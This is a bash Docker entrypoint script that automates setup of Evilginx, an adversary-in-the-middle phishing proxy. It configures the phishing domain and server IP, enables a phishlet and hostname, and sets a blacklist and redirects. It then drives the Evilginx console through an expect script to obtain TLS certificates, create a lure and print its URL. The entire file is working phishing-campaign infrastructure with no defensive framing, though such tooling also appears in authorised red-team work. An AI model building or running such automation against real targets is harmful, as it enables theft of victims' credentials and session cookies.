#!/bin/bash
set -e

CONFIG_DIR="/root/.evilginx"
CONFIG_JSON="${CONFIG_DIR}/config.json"
LOG_DIR="/app/logs"
SETUP_SCRIPT="${CONFIG_DIR}/setup.cfg"
LURE_SCRIPT="${CONFIG_DIR}/lure.cfg"

mkdir -p "${LOG_DIR}" "${CONFIG_DIR}/phishlets"

# ---------------------------------------------------
# Check if evilginx was already configured with the
# same settings (persisted in config.json on the volume).
# If so, skip the setup commands — evilginx will restore
# its own config and reuse cached TLS certs on startup.
# ---------------------------------------------------
is_already_configured() {
    [ -f "${CONFIG_JSON}" ] || return 1

    local saved_domain saved_ip saved_hostname saved_enabled
    saved_domain=$(python3 -c "import json; print(json.load(open('${CONFIG_JSON}')).get('general',{}).get('domain',''))" 2>/dev/null)
    saved_ip=$(python3 -c "import json; print(json.load(open('${CONFIG_JSON}')).get('general',{}).get('external_ipv4',''))" 2>/dev/null)
    saved_hostname=$(python3 -c "import json; print(json.load(open('${CONFIG_JSON}')).get('phishlets',{}).get('${PHISHLET_NAME}',{}).get('hostname',''))" 2>/dev/null)
    saved_enabled=$(python3 -c "import json; print(json.load(open('${CONFIG_JSON}')).get('phishlets',{}).get('${PHISHLET_NAME}',{}).get('enabled',''))" 2>/dev/null)

    [ "${saved_domain}" = "${BASE_DOMAIN}" ] && \
    [ "${saved_ip}" = "${SERVER_IP}" ] && \
    [ "${saved_hostname}" = "${PHISHLET_HOSTNAME}" ] && \
    [ "${saved_enabled}" = "True" ]
}

# ---------------------------------------------------
# Generate Evilginx REPL commands from env vars.
# ---------------------------------------------------
generate_setup_config() {
    cat > "${SETUP_SCRIPT}" <<EOF
config domain ${BASE_DOMAIN}
config ipv4 external ${SERVER_IP}
config unauth_url ${REDIRECT_URL}
blacklist ${BLACKLIST_MODE:-unauth}
EOF

    if [ -n "${PHISHLET_NAME}" ] && [ -n "${PHISHLET_HOSTNAME}" ]; then
        cat >> "${SETUP_SCRIPT}" <<EOF
phishlets hostname ${PHISHLET_NAME} ${PHISHLET_HOSTNAME}
phishlets enable ${PHISHLET_NAME}
EOF
    fi

    echo "[*] Generated setup config:"
    cat "${SETUP_SCRIPT}"
}

generate_lure_config() {
    : > "${LURE_SCRIPT}"
    if [ -n "${PHISHLET_NAME}" ]; then
        echo "lures create ${PHISHLET_NAME}" >> "${LURE_SCRIPT}"
        if [ -n "${LURE_REDIRECT_URL}" ]; then
            echo "lures edit 0 redirect_url ${LURE_REDIRECT_URL}" >> "${LURE_SCRIPT}"
        fi
        if [ -n "${LURE_PATH}" ]; then
            echo "lures edit 0 path ${LURE_PATH}" >> "${LURE_SCRIPT}"
        fi
    fi
}

# ---------------------------------------------------
# Merge default + custom phishlets into the data dir.
# ---------------------------------------------------
setup_phishlets() {
    local default_count custom_count
    default_count=0
    custom_count=0

    if compgen -G "/app/phishlets-default/*.yaml" > /dev/null; then
        cp /app/phishlets-default/*.yaml "${CONFIG_DIR}/phishlets/" 2>/dev/null || true
        default_count=$(ls /app/phishlets-default/*.yaml 2>/dev/null | wc -l)
    fi
    echo "[*] Loaded ${default_count} default phishlet(s) from /app/phishlets-default"

    if compgen -G "/app/phishlets/*.yaml" > /dev/null; then
        cp /app/phishlets/*.yaml "${CONFIG_DIR}/phishlets/" 2>/dev/null || true
        custom_count=$(ls /app/phishlets/*.yaml 2>/dev/null | wc -l)
    fi
    echo "[*] Loaded ${custom_count} custom phishlet(s) from /app/phishlets (overrides)"
}

# ---------------------------------------------------
# Main
# ---------------------------------------------------
echo "==========================================="
echo " Evilginx Docker Infrastructure"
echo " Domain:   ${BASE_DOMAIN}"
echo " IP:       ${SERVER_IP}"
echo " Phishlet: ${PHISHLET_NAME}"
echo "==========================================="

setup_phishlets

if is_already_configured; then
    echo "[*] Config unchanged — reusing saved config and cached TLS certs"
    NEED_SETUP=false
else
    echo "[*] First run or config changed — will apply setup via REPL"
    NEED_SETUP=true
    generate_setup_config
fi

generate_lure_config

echo "[*] Starting Evilginx..."

if [ "${NEED_SETUP}" = "true" ]; then
    # Full setup: feed config commands, wait for certs, then create lure
    cat > /tmp/autoconfig.exp <<EXPEOF
#!/usr/bin/expect -f
set timeout 120

spawn evilginx -p ${CONFIG_DIR}/phishlets -debug

expect {
    "+-----" {}
    timeout { puts "\[!\] Timed out waiting for startup"; exit 1 }
}

sleep 1

set f [open "${SETUP_SCRIPT}" r]
while {[gets \$f line] >= 0} {
    if {\$line ne ""} {
        send "\$line\r"
        sleep 1
    }
}
close \$f

puts "\n\[*\] Waiting for TLS certificates..."
expect {
    "successfully set up" {}
    "failed to" { puts "\[!\] Certificate provisioning failed — check DNS" }
    timeout { puts "\[!\] Timed out waiting for certificates" }
}

sleep 2

set f [open "${LURE_SCRIPT}" r]
while {[gets \$f line] >= 0} {
    if {\$line ne ""} {
        send "\$line\r"
        sleep 1
    }
}
close \$f

sleep 1
send "lures get-url 0\r"
sleep 1

puts "\n\[+\] Auto-config complete. Attach with: docker attach evilginx (Ctrl-P Ctrl-Q to detach)"
interact
EXPEOF
else
    # Restart: config is already saved, just create a lure after startup
    cat > /tmp/autoconfig.exp <<EXPEOF
#!/usr/bin/expect -f
set timeout 120

spawn evilginx -p ${CONFIG_DIR}/phishlets -debug

expect {
    "successfully set up" {}
    "failed to" { puts "\[!\] Certificate check failed" }
    timeout { puts "\[!\] Timed out waiting for startup" }
}

sleep 2

set f [open "${LURE_SCRIPT}" r]
while {[gets \$f line] >= 0} {
    if {\$line ne ""} {
        send "\$line\r"
        sleep 1
    }
}
close \$f

sleep 1
send "lures get-url 0\r"
sleep 1

puts "\n\[+\] Restarted with cached config. Attach with: docker attach evilginx (Ctrl-P Ctrl-Q to detach)"
interact
EXPEOF
fi

exec expect /tmp/autoconfig.exp
